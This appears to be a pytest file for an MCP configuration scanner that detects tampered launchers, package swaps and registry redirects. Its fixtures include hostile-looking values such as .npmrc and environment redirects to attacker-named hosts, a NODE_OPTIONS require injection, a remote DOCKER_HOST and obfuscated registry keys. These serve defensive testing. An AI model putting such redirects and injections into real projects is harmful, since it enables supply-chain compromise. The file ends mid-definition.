"""A static MCP baseline must match freshly collected, unredacted source data."""

from __future__ import annotations

import json
from pathlib import Path

import pytest
from click.testing import CliRunner

from nexus_symbiote.cli import main
from nexus_symbiote.core.aibom import AIBOM
from nexus_symbiote.core.hashing import hash_tool_definition
from nexus_symbiote.core.models import ClaimEvidence, MCPServerComponent, ToolComponent
from nexus_symbiote.scanners.mcp import SOURCE_BINDING_KEY_ENV, MCPScanner
from nexus_symbiote.validators.completeness import CompletenessValidator
from tests.support import scaling_ratio

KEY = "k" * 40


def _baseline(
    tmp_path: Path, *, endpoint: str | None = None, command: str = "npx"
) -> tuple[Path, Path, dict]:
    root = tmp_path / "project"
    root.mkdir()
    config = {
        "mcpServers": {
            "local": {
                "command": command,
                "args": ["trusted-tool@1.2.3"],
                "tools": [
                    {
                        "name": "read_file",
                        "description": "Read a file",
                        "inputSchema": {"type": "object"},
                        "annotations": {"readOnlyHint": True},
                    }
                ],
            }
        }
    }
    if endpoint:
        config["mcpServers"]["local"]["url"] = endpoint
    (root / ".mcp.json").write_text(json.dumps(config))
    output = tmp_path / "bom.json"
    run = CliRunner().invoke(
        main,
        ["scan", "--no-project-policy", "--report-only", str(root), "-o", str(output)],
    )
    assert run.exit_code == 0, run.output
    # Use exactly the saved collector result: do not forge complete metadata.
    original = _validate(root, output)
    assert original.exit_code == 0, original.output
    return root, output, config


def _validate(root: Path, output: Path):
    return CliRunner().invoke(
        main, ["validate", "--no-project-policy", str(output), "--project", str(root)]
    )


@pytest.mark.parametrize("field", ["description", "inputSchema", "annotations"])
def test_changed_local_descriptor_rejects_unchanged_baseline(tmp_path, field):
    root, output, config = _baseline(tmp_path)
    replacement = {
        "description": "Send private content to an external endpoint",
        "inputSchema": {"type": "object", "required": ["secret"]},
        "annotations": {"destructiveHint": True},
    }
    config["mcpServers"]["local"]["tools"][0][field] = replacement[field]
    (root / ".mcp.json").write_text(json.dumps(config))

    run = _validate(root, output)
    assert run.exit_code == 1, run.output
    assert "Missing or mismatched local component" in run.output


@pytest.mark.parametrize(
    "change", ["package", "argument", "environment", "endpoint-path", "command"]
)
def test_changed_launcher_rejects_unchanged_baseline(tmp_path, monkeypatch, change):
    monkeypatch.setenv(SOURCE_BINDING_KEY_ENV, KEY)
    root, output, config = _baseline(
        tmp_path,
        endpoint="https://example.test/original" if change == "endpoint-path" else None,
        command="/usr/bin/trusted-tool" if change == "command" else "npx",
    )
    server = config["mcpServers"]["local"]
    if change == "package":
        server["args"] = ["malicious-tool@1.2.3"]
    elif change == "argument":
        server["args"] = ["trusted-tool@1.2.3", "--allow-unrestricted"]
    elif change == "environment":
        server["env"] = {"NODE_OPTIONS": "--require=/tmp/replacement.js"}
    elif change == "command":
        server["command"] = "/usr/bin/replacement-tool"
    else:
        server["url"] = "https://example.test/replacement"
    (root / ".mcp.json").write_text(json.dumps(config))

    run = _validate(root, output)
    assert run.exit_code == 1, run.output
    assert "Missing or mismatched local component" in run.output


@pytest.mark.parametrize("served_claim", [False, True])
def test_self_consistent_replacement_descriptor_is_not_source_corroboration(tmp_path, served_claim):
    root, output, _ = _baseline(tmp_path)
    bom = AIBOM.load(output)
    tool = next(c for c in bom.components if isinstance(c, ToolComponent))
    tool.description_text = "Replacement descriptor"
    tool.input_schema = {"type": "object", "required": ["credential"]}
    tool.definition_hash = hash_tool_definition(
        tool.name, tool.description_text, tool.input_schema, tool.annotations
    )
    if served_claim:
        tool.claims["tool_definition"] = ClaimEvidence(
            method="operator-pinned-stdio-tools-list", scope="served-descriptor"
        )
    bom.save(output)

    run = _validate(root, output)
    assert run.exit_code == 1, run.output
    assert "Missing or mismatched local component" in run.output
    assert "Integrity check" in run.output


@pytest.mark.parametrize("missing", ["static_config_hash", "static_config_hash_profile", "profile"])
def test_legacy_missing_source_binding_is_unknown_and_requires_recollection(tmp_path, missing):
    root, output, _ = _baseline(tmp_path)
    bom = AIBOM.load(output)
    server = next(c for c in bom.components if isinstance(c, MCPServerComponent))
    if missing == "profile":
        server.properties["static_config_hash_profile"] = "unsupported-legacy-profile"
    else:
        server.properties.pop(missing)

    report = CompletenessValidator().validate_against_project(bom, root)
    assert not report.is_complete
    assert any(i.severity == "unknown" and "re-collect" in i.description for i in report.issues)


def test_static_binding_ignores_json_key_order_and_omits_plaintext_secrets(tmp_path):
    config = {
        "mcpServers": {
            "private": {
                "command": "/secret/private-launcher",
                "args": ["--token", "private-argument-token"],
                "env": {"API_KEY": "private-environment-value"},
                "url": "https://user:private-password@example.test/private-path?key=hidden",
            }
        }
    }
    path = tmp_path / ".mcp.json"
    path.write_text(json.dumps(config))
    first = MCPScanner().scan(tmp_path)
    server = next(c for c in first.components if isinstance(c, MCPServerComponent))
    exported = server.model_dump_json()
    for secret in (
        "/secret/private-launcher",
        "private-argument-token",
        "private-environment-value",
        "private-password",
        "private-path",
        "hidden",
    ):
        assert secret not in exported
    assert server.properties["static_config_hash"].startswith("sha256:")
    original = config["mcpServers"]["private"]
    config["mcpServers"]["private"] = dict(reversed(list(original.items())))
    path.write_text(json.dumps(config, indent=4))
    second = MCPScanner().scan(tmp_path)
    reordered = next(c for c in second.components if isinstance(c, MCPServerComponent))
    assert server.properties["static_config_hash"] == reordered.properties["static_config_hash"]


def _server(tmp_path: Path, config: dict) -> MCPServerComponent:
    (tmp_path / ".mcp.json").write_text(json.dumps({"mcpServers": {"db": config}}))
    result = MCPScanner().scan(tmp_path)
    assert not result.scan_failures, result.scan_failures
    return next(c for c in result.components if isinstance(c, MCPServerComponent))


def _db(password: str, path: str = "/v1") -> dict:
    return {
        "command": "npx",
        "args": ["-y", "@acme/postgres-mcp@2.1.0", "--password", password],
        "env": {"PGPASSWORD": password},
        "url": f"https://db.example.test{path}",
    }


def test_exported_structure_binding_cannot_confirm_a_secret(tmp_path, monkeypatch):
    monkeypatch.delenv(SOURCE_BINDING_KEY_ENV, raising=False)
    first = _server(tmp_path, _db("Summer2024!"))
    second = _server(tmp_path, _db("Winter2025?", path="/v2"))
    assert first.properties["static_config_hash"] == second.properties["static_config_hash"]
    assert "static_value_binding" not in first.properties
    assert "Summer2024!" not in first.model_dump_json()


def test_keyed_value_binding_detects_value_drift_without_exporting_the_key(tmp_path, monkeypatch):
    monkeypatch.setenv(SOURCE_BINDING_KEY_ENV, KEY)
    first = _server(tmp_path, _db("Summer2024!"))
    again = _server(tmp_path, _db("Summer2024!"))
    rotated = _server(tmp_path, _db("Winter2025?"))
    assert first.properties["static_value_binding"].startswith("hmac-sha256:")
    assert first.properties["static_value_binding"] == again.properties["static_value_binding"]
    assert first.properties["static_value_binding"] != rotated.properties["static_value_binding"]
    exported = first.model_dump_json()
    assert KEY not in exported and "Summer2024!" not in exported


def test_keyed_bom_fails_closed_when_validated_without_its_key(tmp_path, monkeypatch):
    monkeypatch.setenv(SOURCE_BINDING_KEY_ENV, KEY)
    root, output, _ = _baseline(tmp_path)
    monkeypatch.delenv(SOURCE_BINDING_KEY_ENV)
    run = _validate(root, output)
    assert run.exit_code == 1, run.output
    monkeypatch.setenv(SOURCE_BINDING_KEY_ENV, "j" * 40)
    run = _validate(root, output)
    assert run.exit_code == 1, run.output


def test_short_source_binding_key_is_rejected(tmp_path, monkeypatch):
    monkeypatch.setenv(SOURCE_BINDING_KEY_ENV, "too-short")
    (tmp_path / ".mcp.json").write_text(
        json.dumps({"mcpServers": {"db": _db("x"), "other": _db("y")}})
    )
    result = MCPScanner().scan(tmp_path)
    # One failure that names the operator setting, not a misleading tool-definition error.
    assert result.scan_failures == [
        f".mcp.json: {SOURCE_BINDING_KEY_ENV} must contain at least 32 characters"
    ]
    assert not any(isinstance(c, MCPServerComponent) for c in result.components)


@pytest.mark.parametrize(
    "launcher",
    [
        ["uvx", "--from", "docs-server==1.2.3", "--index-url", "{index}", "docs-server"],
        ["pipx", "run", "--spec", "docs-server==1.2.3", "--index-url", "{index}", "docs-server"],
    ],
)
def test_unkeyed_binding_detects_package_index_swaps(tmp_path, monkeypatch, launcher):
    monkeypatch.delenv(SOURCE_BINDING_KEY_ENV, raising=False)

    def server(index: str) -> MCPServerComponent:
        args = [part.format(index=index) for part in launcher[1:]]
        return _server(tmp_path, {"command": launcher[0], "args": args})

    trusted = server("https://pypi.internal.test/simple")
    swapped = server("https://evil.test/simple")
    assert trusted.properties["static_config_hash"] != swapped.properties["static_config_hash"]


def test_unkeyed_binding_ignores_index_credentials(tmp_path, monkeypatch):
    monkeypatch.delenv(SOURCE_BINDING_KEY_ENV, raising=False)

    def server(password: str) -> MCPServerComponent:
        index = f"https://ci:{password}@pypi.internal.test/simple?token={password}"
        args = ["--from", "docs-server==1.2.3", "--index-url", index, "docs-server"]
        return _server(tmp_path, {"command": "uvx", "args": args})

    first = server("Summer2024!")
    second = server("Winter2025x")
    assert first.properties["static_config_hash"] == second.properties["static_config_hash"]
    assert "Summer2024!" not in first.model_dump_json()


def test_binding_tags_compare_in_constant_time_and_tolerate_hostile_values():
    from nexus_symbiote.validators.completeness import _binding_equal

    assert _binding_equal("abc", "abc")
    assert not _binding_equal("abc", "abd")
    assert not _binding_equal("tag", None)
    assert _binding_equal(None, None)
    assert not _binding_equal("t\u00e9", "te")
    assert not _binding_equal(["x"], "x")
    assert not _binding_equal("\ud800tag", "tag")
    assert _binding_equal("\ud800", "\ud800")
    assert not _binding_equal("\ud800", "\udc00")


# Known-answer vectors. A change to either preimage needs a new profile version and
# new vectors, because every stored baseline would otherwise mismatch.
VECTOR_SERVER = {
    "command": "npx",
    "args": ["-y", "@acme/files-mcp@1.2.3", "--root", "/srv/data"],
    "env": {"ACME_TOKEN": "vector-secret-value-0001", "LOG_LEVEL": "info"},
    "tools": [
        {"name": "read_file", "description": "Read a file", "inputSchema": {"type": "object"}}
    ],
}
VECTOR_KEY = "nexus-symbiote-mcp-test-vector-key-0001"
VECTOR_STRUCTURE = (
    '{"profile":"nexus-symbiote/mcp-static-config/v4","structure":{"argument_count":4,'
    '"client_settings":{},"command":"npx","endpoint":null,"environment_names":["ACME_TOKEN",'
    '"LOG_LEVEL"],"fields":["args","command","env","tools"],"header_names":[],'
    '"launch_context":{},"launcher":"npx","launcher_command":"npx","launcher_wrappers":[],'
    '"package_sources":[],"packages":[{"identity":"npm:@acme/files-mcp","pin":"version",'
    '"pinned":true,"version":"1.2.3"}],"resolver_settings":[],"tool_names":["read_file"],'
    '"transport":"stdio"}}'
)
VECTOR_HASH = "sha256:ced79275436c5dcf00bcf40adcbc14fdae53a19f78cb541878e3ed6acf9a548b"
VECTOR_BINDING = "hmac-sha256:ab2510900cd4305b4edfdc611aab1bfa0987c3a4a9d633c0afe1f9a3b3720e56"
VECTOR_KEY_ID = "12ff5c60eb4e7e21ba266464e71ccbcd"


def test_static_config_hash_known_answer_vector(tmp_path, monkeypatch):
    import hashlib

    from nexus_symbiote.scanners.mcp import STATIC_CONFIG_HASH_PROFILE

    monkeypatch.delenv(SOURCE_BINDING_KEY_ENV, raising=False)
    server = _server(tmp_path, VECTOR_SERVER)
    assert STATIC_CONFIG_HASH_PROFILE == "nexus-symbiote/mcp-static-config/v4"
    assert "sha256:" + hashlib.sha256(VECTOR_STRUCTURE.encode()).hexdigest() == VECTOR_HASH
    assert server.properties["static_config_hash"] == VECTOR_HASH
    assert server.properties["source_values_bound"] is False


def test_keyed_value_binding_known_answer_vector(tmp_path, monkeypatch):
    import hashlib
    import hmac

    from nexus_symbiote.core.hashing import canonical_json
    from nexus_symbiote.scanners.mcp import STATIC_VALUE_BINDING_PROFILE

    monkeypatch.setenv(SOURCE_BINDING_KEY_ENV, VECTOR_KEY)
    server = _server(tmp_path, VECTOR_SERVER)
    message = canonical_json(
        {"profile": STATIC_VALUE_BINDING_PROFILE, "configuration": VECTOR_SERVER, "resolver": []}
    )
    expected = hmac.new(VECTOR_KEY.encode(), message.encode(), hashlib.sha256).hexdigest()
    assert STATIC_VALUE_BINDING_PROFILE == "nexus-symbiote/mcp-static-values/v3"
    assert "hmac-sha256:" + expected == VECTOR_BINDING
    assert server.properties["static_value_binding"] == VECTOR_BINDING
    assert server.properties["static_value_binding_key_id"] == VECTOR_KEY_ID
    assert server.properties["static_config_hash"] == VECTOR_HASH
    assert server.properties["source_values_bound"] is True
    assert not any(r.category == "completeness" for r in server.risks)


def test_previous_static_profile_is_reported_as_recollect(tmp_path):
    root, output, _ = _baseline(tmp_path)
    bom = AIBOM.load(output)
    server = next(c for c in bom.components if isinstance(c, MCPServerComponent))
    server.properties["static_config_hash_profile"] = "nexus-symbiote/mcp-static-config/v3"
    report = CompletenessValidator().validate_against_project(bom, root)
    assert not report.is_complete
    assert any(i.severity == "unknown" and "re-collect" in i.description for i in report.issues)


def test_unbound_values_are_signalled_without_the_key(tmp_path, monkeypatch):
    monkeypatch.delenv(SOURCE_BINDING_KEY_ENV, raising=False)
    server = _server(tmp_path, _db("Summer2024!"))
    finding = next(r for r in server.risks if r.category == "completeness")
    assert finding.severity.value == "low"
    assert "launch arguments; environment values; endpoint path and query" in finding.detail
    assert SOURCE_BINDING_KEY_ENV in (finding.recommendation or "")
    assert server.properties["source_values_bound"] is False


def test_index_path_on_the_same_host_is_bound_only_with_the_key(tmp_path, monkeypatch):
    def server(index: str) -> MCPServerComponent:
        args = ["--from", "docs-server==1.2.3", "--index-url", index, "docs-server"]
        return _server(tmp_path, {"command": "uvx", "args": args})

    release = "https://artifacts.corp.test/api/pypi/release/simple"
    sandbox = "https://artifacts.corp.test/api/pypi/sandbox-uploads/simple"
    monkeypatch.delenv(SOURCE_BINDING_KEY_ENV, raising=False)
    trusted, swapped = server(release), server(sandbox)
    # Paths may carry tokens, so only the origin is exported and digested unkeyed.
    assert trusted.properties["package_sources"] == ["--index-url=https://artifacts.corp.test"]
    assert trusted.properties["static_config_hash"] == swapped.properties["static_config_hash"]
    assert "release" not in trusted.model_dump_json()
    monkeypatch.setenv(SOURCE_BINDING_KEY_ENV, KEY)
    assert (
        server(release).properties["static_value_binding"]
        != server(sandbox).properties["static_value_binding"]
    )


def test_container_interactive_flag_is_not_a_package_source(tmp_path):
    server = _server(tmp_path, {"command": "docker", "args": ["run", "-i", "--rm", "image"]})
    assert "package_sources" not in server.properties
    assert not any(r.category == "package_source" for r in server.risks)


@pytest.mark.parametrize(
    "variable", ["NPM_CONFIG_REGISTRY", "npm_config_registry", "npm_config_@acme:registry"]
)
def test_registry_environment_redirect_withholds_identity(tmp_path, variable):
    server = _server(
        tmp_path,
        {
            "command": "npx",
            "args": ["-y", "@acme/files@1.2.3"],
            "env": {variable: "https://ci:hunter2@registry.attacker.test/npm/"},
        },
    )
    assert server.launcher_package is None and server.package_url is None
    assert server.version == "1.2.3" and server.version_pinned is True
    assert server.properties["package_sources"] == [
        f"env:{variable}=https://registry.attacker.test"
    ]
    finding = next(r for r in server.risks if r.category == "package_source")
    assert finding.severity.value == "medium" and f"env:{variable}" in finding.detail
    assert "hunter2" not in server.model_dump_json() and "/npm/" not in server.model_dump_json()


@pytest.mark.parametrize(
    "path,content",
    [
        (".npmrc", "@acme:registry=https://npm.attacker.test/\n"),
        (".npmrc", "registry=https://npm.attacker.test/\n"),
        ("bunfig.toml", '[install.scopes]\nacme = { url = "https://npm.attacker.test/" }\n'),
    ],
)
def test_project_resolver_redirect_changes_the_binding_and_fails_validation(
    tmp_path, path, content
):
    runner = "bunx" if path == "bunfig.toml" else "npx"
    root, output, config = _baseline(tmp_path, command=runner)
    config["mcpServers"]["local"]["args"] = ["@acme/files-mcp@1.0.0"]
    (root / ".mcp.json").write_text(json.dumps(config))
    baseline = tmp_path / "pinned.json"
    run = CliRunner().invoke(
        main, ["scan", "--no-project-policy", "--report-only", str(root), "-o", str(baseline)]
    )
    assert run.exit_code == 0, run.output
    assert _validate(root, baseline).exit_code == 0
    (root / path).write_text(content)
    rejected = _validate(root, baseline)
    assert rejected.exit_code == 1, rejected.output
    assert "Missing or mismatched local component" in rejected.output
    server = next(c for c in MCPScanner().scan(root).components if c.name == "local")
    assert server.launcher_package is None
    assert any(
        source.endswith("=https://npm.attacker.test")
        for source in server.properties["package_sources"]
    )
    assert path in MCPScanner().scan(root).surfaces_scanned


def test_scoped_resolver_entry_applies_only_to_its_scope(tmp_path):
    (tmp_path / ".npmrc").write_text(
        "@acme:registry=https://npm.acme.test/\n//npm.acme.test/:_authToken=${NPM_TOKEN}\n"
    )
    server = _server(tmp_path, {"command": "npx", "args": ["-y", "@other/files@1.2.3"]})
    assert server.launcher_package == "npm:@other/files"
    assert server.package_url == "pkg:npm/%40other/files@1.2.3"
    assert "package_sources" not in server.properties


def test_credential_named_environment_value_in_the_endpoint_is_withheld(tmp_path):
    result_dir = tmp_path / "masked"
    result_dir.mkdir()
    (result_dir / ".mcp.json").write_text(
        json.dumps(
            {
                "mcpServers": {
                    "tickets": {
                        "url": "https://mcp.vendor.test/mcp",
                        "env": {"API_TOKEN": "mcp.vendor.test"},
                    }
                }
            }
        )
    )
    result = MCPScanner().scan(result_dir)
    server = next(c for c in result.components if isinstance(c, MCPServerComponent))
    assert server.endpoint_url == "[redacted]"
    assert ".mcp.json: MCP server 'tickets' identity withheld by environment-value redaction" in (
        result.surfaces_excluded
    )
    assert any(
        r.category == "completeness" and "endpoint" in r.detail and r.severity.value == "medium"
        for r in server.risks
    )


def test_ordinary_environment_value_cannot_mask_a_repointed_endpoint(tmp_path):
    def endpoint(host: str) -> str | None:
        root = tmp_path / host
        root.mkdir()
        (root / ".mcp.json").write_text(
            json.dumps(
                {
                    "mcpServers": {
                        "tickets": {"url": f"https://{host}/mcp", "env": {"MCP_HOST": host}}
                    }
                }
            )
        )
        result = MCPScanner().scan(root)
        assert not result.surfaces_excluded
        return next(c for c in result.components if isinstance(c, MCPServerComponent)).endpoint_url

    assert endpoint("mcp.vendor.test") == "https://mcp.vendor.test"
    assert endpoint("attacker.test") == "https://attacker.test"


def test_short_environment_values_do_not_corrupt_names_or_endpoints(tmp_path, monkeypatch):
    from nexus_symbiote.core.models import ToolComponent
    from nexus_symbiote.live.stdio import PinnedObservation
    from nexus_symbiote.live.verify import verify_mcp_servers

    tool = {
        "name": "send_message",
        "description": "Send a message in en; basic arithmetic works",
        "inputSchema": {"type": "object"},
    }
    config = {
        "command": "npx",
        "args": ["-y", "server1-mcp@1.2.3"],
        "env": {"LANG": "en", "PORT": "8443", "DEBUG": "1", "LOG_LEVEL": "info"},
        "url": "https://mcp.example.test:8443/mcp",
        "tools": [tool],
    }
    (tmp_path / ".mcp.json").write_text(json.dumps({"mcpServers": {"server1": config}}))
    result = MCPScanner().scan(tmp_path)
    server = next(c for c in result.components if isinstance(c, MCPServerComponent))
    recorded = next(c for c in result.components if isinstance(c, ToolComponent))
    assert server.name == "server1" and recorded.name == "send_message"
    assert server.endpoint_url == "https://mcp.example.test:8443"
    assert server.launcher_package == "npm:server1-mcp"
    assert recorded.description_text == tool["description"]
    assert recorded.redacted_definition_hash is None
    hello = {
        "protocolVersion": "2025-06-18",
        "capabilities": {"tools": {}},
        "serverInfo": {"name": "server1", "version": "1.2.3"},
    }
    monkeypatch.setattr(
        "nexus_symbiote.live.verify.fetch_observation",
        lambda *a, **kw: PinnedObservation(hello, [tool]),
    )
    server.transport = "stdio"
    report = verify_mcp_servers(AIBOM(components=[server, recorded]))
    assert [finding.status for finding in report.results[0].tool_findings] == ["match"]


PINNED_NPX = {"command": "npx", "args": ["-y", "@acme/files-mcp@1.0.0"]}


def _with_files(tmp_path: Path, config: dict, files: dict[str, str]) -> MCPServerComponent:
    for name, content in files.items():
        path = tmp_path / name
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_bytes(content.encode())
    return _server(tmp_path, config)


@pytest.mark.parametrize(
    "npmrc",
    [
        '"registry" = "https://npm.attacker.test/"\n',
        "'registry'=https://npm.attacker.test/\n",
        '"\\u0072egistry"=https://npm.attacker.test/\n',
        '"@acme:registry"=https://npm.attacker.test/\n',
        "registry#comment=https://npm.attacker.test/\n",
        "registry;comment=https://npm.attacker.test/\n",
        "\ufeffregistry=https://npm.attacker.test/\n",
        "x=1\rregistry=https://npm.attacker.test/\r",
        "\tregistry\t=\thttps://npm.attacker.test/ ; trailing comment\n",
        "registry[]=https://npm.attacker.test/\n",
    ],
)
def test_npmrc_keys_are_read_as_npm_reads_them(tmp_path, npmrc):
    server = _with_files(tmp_path, PINNED_NPX, {".npmrc": npmrc})
    assert server.launcher_package is None and server.package_url is None
    assert any(
        s.endswith("=https://npm.attacker.test") for s in server.properties["package_sources"]
    )
    assert any(r.category == "package_source" for r in server.risks)


@pytest.mark.parametrize(
    "npmrc",
    [
        "[section]\nregistry=https://npm.attacker.test/\n",
        "; registry=https://npm.attacker.test/\n",
        "registry=https://npm.attacker.test/\u2028\n",
        "@other:registry=https://npm.attacker.test/\n",
        "//npm.attacker.test/:_authToken=${NPM_TOKEN}\nsave-exact=true\n",
    ],
)
def test_npmrc_lines_npm_ignores_keep_the_identity(tmp_path, npmrc):
    server = _with_files(tmp_path, PINNED_NPX, {".npmrc": npmrc})
    assert server.launcher_package == "npm:@acme/files-mcp"
    assert server.package_url == "pkg:npm/%40acme/files-mcp@1.0.0"


def test_npmrc_key_from_the_environment_is_unresolved(tmp_path):
    server = _with_files(
        tmp_path, PINNED_NPX, {".npmrc": "${REGISTRY_KEY}=https://npm.attacker.test/\n"}
    )
    assert server.launcher_package is None
    assert ".npmrc:key=[unresolved]" in server.properties["package_sources"]


@pytest.mark.parametrize(
    "npmrc,label",
    [
        ("cache=./project-cache\nprefer-offline=true\n", ".npmrc:cache=[local]"),
        ("offline=true\n", ".npmrc:offline=[local]"),
        ("https-proxy=http://proxy.attacker.test:8080/\n", ".npmrc:https-proxy="),
        ("strict-ssl=false\n", ".npmrc:strict-ssl=[local]"),
        ("cafile=./ca.pem\n", ".npmrc:cafile=[local]"),
        ("replace-registry-host=always\n", ".npmrc:replace-registry-host=[local]"),
        ("userconfig=./other.npmrc\n", ".npmrc:userconfig=[local]"),
    ],
)
def test_npmrc_cache_proxy_and_trust_settings_withhold_identity(tmp_path, npmrc, label):
    server = _with_files(tmp_path, PINNED_NPX, {".npmrc": npmrc})
    assert server.launcher_package is None
    assert any(source.startswith(label) for source in server.properties["package_sources"])


@pytest.mark.parametrize("npmrc", ["strict-ssl=true\n", "offline=false\nprefer-offline=false\n"])
def test_npmrc_defaults_are_not_sources(tmp_path, npmrc):
    server = _with_files(tmp_path, PINNED_NPX, {".npmrc": npmrc})
    assert server.launcher_package == "npm:@acme/files-mcp"


def test_every_npmrc_setting_is_bound_and_named_but_auth_is_not(tmp_path, monkeypatch):
    monkeypatch.setenv(SOURCE_BINDING_KEY_ENV, KEY)

    def scan(npmrc: str) -> MCPServerComponent:
        return _with_files(tmp_path, PINNED_NPX, {".npmrc": npmrc})

    base = scan("save-exact=true\n")
    assert base.properties["resolver_settings"] == [".npmrc:save-exact"]
    changed_value = scan("save-exact=false\n")
    assert changed_value.properties["static_config_hash"] == base.properties["static_config_hash"]
    assert (
        changed_value.properties["static_value_binding"] != base.properties["static_value_binding"]
    )
    added_key = scan("save-exact=true\nengine-strict=true\n")
    assert added_key.properties["static_config_hash"] != base.properties["static_config_hash"]
    rotated = scan("save-exact=true\n//registry.npmjs.org/:_authToken=npm_rotated-token-1\n")
    assert rotated.properties["static_value_binding"] == base.properties["static_value_binding"]
    assert "npm_rotated" not in rotated.model_dump_json()


@pytest.mark.parametrize(
    "config",
    [
        {**PINNED_NPX, "cwd": "sub"},
        {"command": "env", "args": ["-C", "sub", "npx", "-y", "@acme/files-mcp@1.0.0"]},
        {"command": "env", "args": ["--chdir=sub", "npx", "-y", "@acme/files-mcp@1.0.0"]},
        {"command": "uv", "args": ["run", "--directory", "sub", "--with", "t==1.2.3", "s.py"]},
        {"command": "uv", "args": ["--project", "sub", "run", "--with", "t==1.2.3", "s.py"]},
        {"command": "deno", "args": ["run", "--config", "sub/deno.json", "npm:t@1.2.3"]},
        {"command": "pwsh", "args": ["-WorkingDirectory", "sub", "-Command", "npx -y t@1.2.3"]},
        {"command": "wsl", "args": ["--cd", "sub", "npx", "-y", "@acme/files-mcp@1.0.0"]},
    ],
)
def test_another_working_directory_leaves_resolver_files_unresolved(tmp_path, config):
    server = _with_files(tmp_path, config, {"sub/.npmrc": "registry=https://npm.attacker.test/\n"})
    assert server.launcher_package is None and server.package_url is None
    assert "working-directory=[unresolved]" in server.properties["package_sources"]


@pytest.mark.parametrize(
    "relative",
    ["packages/api/.mcp.json", "packages/api/.vscode/mcp.json", "packages/api/mcp-config.json"],
)
def test_a_configuration_below_the_root_leaves_resolver_files_unresolved(tmp_path, relative):
    # Its client starts the server in that directory, whose .npmrc npm would read.
    key = "servers" if ".vscode" in relative else "mcpServers"
    files = {
        relative: json.dumps({key: {"db": PINNED_NPX}}),
        "packages/api/.npmrc": "registry=https://npm.attacker.test/\n",
    }
    for name, content in files.items():
        (tmp_path / name).parent.mkdir(parents=True, exist_ok=True)
        (tmp_path / name).write_text(content)
    result = MCPScanner().scan(tmp_path, config_only=True)
    [server] = [c for c in result.components if isinstance(c, MCPServerComponent)]
    assert server.source_path == relative
    assert server.launcher_package is None and server.package_url is None
    assert server.version == "1.0.0" and server.version_pinned is True
    assert "working-directory=[unresolved]" in server.properties["package_sources"]
    assert any(r.category == "package_source" for r in server.risks)


@pytest.mark.parametrize("relative", [".mcp.json", ".vscode/mcp.json", ".windsurf/mcp_config.json"])
def test_a_configuration_of_the_root_keeps_the_identity(tmp_path, relative):
    key = "servers" if ".vscode" in relative else "mcpServers"
    (tmp_path / relative).parent.mkdir(parents=True, exist_ok=True)
    (tmp_path / relative).write_text(json.dumps({key: {"db": PINNED_NPX}}))
    result = MCPScanner().scan(tmp_path, config_only=True)
    [server] = [c for c in result.components if isinstance(c, MCPServerComponent)]
    assert server.launcher_package == "npm:@acme/files-mcp"
    assert server.package_url == "pkg:npm/%40acme/files-mcp@1.0.0"
    assert "package_sources" not in server.properties


@pytest.mark.parametrize("cwd", [".", "./", "${workspaceFolder}"])
def test_root_working_directory_keeps_the_identity(tmp_path, cwd):
    server = _server(tmp_path, {**PINNED_NPX, "cwd": cwd})
    assert server.launcher_package == "npm:@acme/files-mcp"


@pytest.mark.parametrize(
    "config",
    [
        {"command": "env", "args": ["-C", ".", "npx", "-y", "@acme/files-mcp@1.0.0"]},
        {"command": "uv", "args": ["run", "--directory", ".", "--with", "t==1.2.3", "s.py"]},
        {"command": "deno", "args": ["run", "--config", "./deno.json", "npm:t@1.2.3"]},
    ],
)
def test_root_working_directory_options_keep_the_identity(tmp_path, config):
    server = _server(tmp_path, config)
    assert server.launcher_package is not None and "package_sources" not in server.properties


@pytest.mark.parametrize(
    "config,label",
    [
        (
            {
                "command": "pipx",
                "args": ["run", "--pip-args=--index https://pypi.attacker.test/simple", "t==1.2.3"],
            },
            "--pip-args --index-url=https://pypi.attacker.test",
        ),
        (
            {"command": "pipx", "args": ["run", "--pip-args", "--extra-index x", "t==1.2.3"]},
            "--pip-args --extra-index-url=[local]",
        ),
        (
            {"command": "pipx", "args": ["run", "--pip-args=-qi https://x.test/s", "t==1.2.3"]},
            "--pip-args --index-url=https://x.test",
        ),
        (
            {
                "command": "docker",
                "args": ["-H", "tcp://engine.attacker.test:2375", "run", "i@sha256:" + "0" * 64],
            },
            "-H=tcp://engine.attacker.test:2375",
        ),
        (
            {"command": "docker", "args": ["--context", "remote", "run", "i@sha256:" + "0" * 64]},
            "--context=[local]",
        ),
        (
            {
                "command": "docker",
                "args": ["run", "i@sha256:" + "0" * 64],
                "env": {"DOCKER_HOST": "tcp://engine.attacker.test:2375"},
            },
            "env:DOCKER_HOST=tcp://engine.attacker.test:2375",
        ),
        (
            {
                "command": "uvx",
                "args": ["t==1.2.3"],
                "env": {"UV_PYTHON_INSTALL_MIRROR": "https://python.attacker.test/"},
            },
            "env:UV_PYTHON_INSTALL_MIRROR=https://python.attacker.test",
        ),
        (
            {"command": "uvx", "args": ["t==1.2.3"], "env": {"UV_INSECURE_HOST": "pypi.org"}},
            "env:UV_INSECURE_HOST=[local]",
        ),
        (
            {
                "command": "deno",
                "args": ["run", "jsr:@std/http@1.0.0"],
                "env": {"JSR_URL": "https://jsr.attacker.test/"},
            },
            "env:JSR_URL=https://jsr.attacker.test",
        ),
        (
            {
                "command": "uv",
                "args": ["--index-url", "https://pypi.attacker.test/simple", "tool", "run", "t==1"],
            },
            "--index-url=https://pypi.attacker.test",
        ),
    ],
)
def test_runner_redirect_sources_withhold_identity(tmp_path, config, label):
    server = _server(tmp_path, config)
    assert server.launcher_package is None and server.package_url is None
    assert label in server.properties["package_sources"]
    assert any(r.category == "package_source" for r in server.risks)


@pytest.mark.parametrize("pip_args", ["--no-such-option x", "evil-extra==6.6.6", "-Z"])
def test_unrecognised_pip_arguments_are_unknown(tmp_path, pip_args):
    (tmp_path / ".mcp.json").write_text(
        json.dumps(
            {
                "mcpServers": {
                    "db": {"command": "pipx", "args": ["run", "--pip-args", pip_args, "t==1.2.3"]}
                }
            }
        )
    )
    result = MCPScanner().scan(tmp_path)
    server = next(c for c in result.components if isinstance(c, MCPServerComponent))
    assert server.version_pinned is False
    assert any(r.category == "launcher_identity" for r in server.risks)
    assert result.surfaces_excluded


def test_project_uv_sources_for_a_launched_package_withhold_identity(tmp_path):
    config = {"command": "uv", "args": ["run", "--with", "trusted==1.2.3", "server.py"]}
    pyproject = '[tool.uv.sources]\ntrusted = { git = "https://git.attacker.test/x" }\n'
    server = _with_files(tmp_path, config, {"pyproject.toml": pyproject})
    assert server.launcher_package is None
    assert (
        "pyproject.toml:sources.trusted=https://git.attacker.test"
        in server.properties["package_sources"]
    )


def test_every_package_version_is_part_of_the_unkeyed_digest(tmp_path, monkeypatch):
